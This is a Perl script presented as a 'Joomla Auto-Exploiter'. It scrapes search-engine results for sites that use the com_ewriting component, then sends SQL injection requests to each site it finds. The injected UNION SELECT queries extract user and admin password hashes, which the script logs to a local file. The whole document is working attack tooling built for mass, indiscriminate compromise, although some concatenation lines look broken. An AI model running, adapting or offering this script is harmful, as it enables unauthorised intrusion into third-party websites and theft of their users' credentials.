use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
use URI;
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request::Common;
$|++;
print "[i] Recomnmended Dork: index.php?option=com_ewriting \n";
print "please input your dork : ";
chomp ($kiddies=<STDIN>);
print "\n";
print "Name file and path of the hash result file : ";
chomp ($peti=<STDIN>);
print "\n";
print "Name of the site result file and path : ";
chomp ($babies=<STDIN>);
print "\n\n";
if ($kiddies=~ /(.*)/){

    print "+===============================+\n";
    print "| Searching, please wait...     |\n";
    print "| Search via Dorl               |\n";
    print "| Joomla Auto-Exploiter         |\n";
    print "| Ctrl + C to abort operation   |\n";
    print "+===============================+\n\n";

my $flyff666=$1;

# Starting The Search Engine
my @mlist=&ugds($flyff666);

sub ugds(){

my @lst;
for($spykit=1;$spykit<=500;$spykit+=1){

#------------------------------------------

my $wisdom=LWP::UserAgent->new;
$wisdom->agent("");

#------------------------------------------
my $google=("http://search.live.com/results.aspx?q=".$flyff666."&first=".$spykit."&FORM=PERE");
my $g0nzhack=$wisdom->get("$google");
$g0nzhack->as_string;
my $Res=$g0nzhack->content;
print "By default Joomla Passwords are MD5 Formated. But also could be MySQL.\n";
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)/g || $Res =~ m/<a href=\"?https:\/\/([^>\"]*)/g){
if($1 !~ /msn|live|microsoft|WindowsLiveTranslator|youtube|google|cache|74.125.153.132|inurl:|q=|404|403|Time|out|Network|Failed/){

    my $gunslinger=$1;
    $gunslinger=~s/&(.*)/\ /g;
    print "Site found: http://$gunslinger\n";
	if(index($gunslinger, $kiddies) != -1){
    open(FILE,">>$babies");
    print FILE "http://$gunslinger\n";
    close(FILE);	
	}
    print "++++++ [ Exploiting ] ++++++\n";
	use LWP::UserAgent;
    $target = "http://$gunslinger";
    $code="UNION+ALL+SELECT+1,2,concat(username,0x3a,password),4,5,6,7,8,9,10+FROM+"+pre+"_users--;";
    $agent = LWP::UserAgent->new() or die "[!] Error while processing: $!";
    $agent->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.12011');
    $host= $target. "/index.php?option=com_ewriting&Itemid=9999&func=selectcat&cat=-1==".$code;
    $ok = $agent->request(HTTP::Request->new(GET=>$host));
    $ok1 = $ok->content; if ($ok1 =~/([0-9a-fA-F]{32})/){
    print "[+] User Password found --> $1$2 --> Saved At $peti\n";
    $UserHashFound = 'true';
	if($UserHashFound eq 'true'){
    open(FILE,">>$peti");
    print FILE "+++++++++++ http://$gunslinger +++++++++++\n";
    print FILE "Found Hashes:\n";
    print FILE "User Hash: $1\n$2\n";
    close(FILE);
	$AddLine = 'true';
	}
    sleep 1;
    }
    else
    {
    print "[-] User Password not found \n";
    }
	$code="UNION+ALL+SELECT+1,2,concat(username,0x3a,password),4,5,6,7,8,9,10+FROM+"+pre+"_admin+or+Admin+or+admin_user--;";
    $agent = LWP::UserAgent->new() or die "[!] Error while processing";
    $agent->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.12011');
    $host= $target. "/index.php?option=com_ewriting&Itemid=9999&func=selectcat&cat=-1==".$code;
    $ok = $agent->request(HTTP::Request->new(GET=>$host));
    $ok1 = $ok->content; if ($ok1 =~/([0-9a-fA-F]{32})/){
    print "[+] Admin Password found --> $1$2 --> Saved At $peti\n";
    $AdminHashFound = 'true';
    if($AdminHashFound eq 'true'){
	if($AddLine eq 'true'){
    open(FILE,">>$peti");
    print FILE "Admin Hash: $1\n$2\n";
	print FILE "+++++++++++++++++++++++++++++++++++++++++++\n";
    close(FILE);	
	}else{
	open(FILE,">>$peti");
    print FILE "+++++++++++ http://$gunslinger +++++++++++\n";
    print FILE "Found Hashes:\n";
    print FILE "Admin Hash: $1\n$2\n";
	print FILE "+++++++++++++++++++++++++++++++++++++++++++\n";
    close(FILE);
	}
	}
    sleep 1;
    }
    else
    {
    print "[-] Admin Password not found \n";
    }    

}}}
}}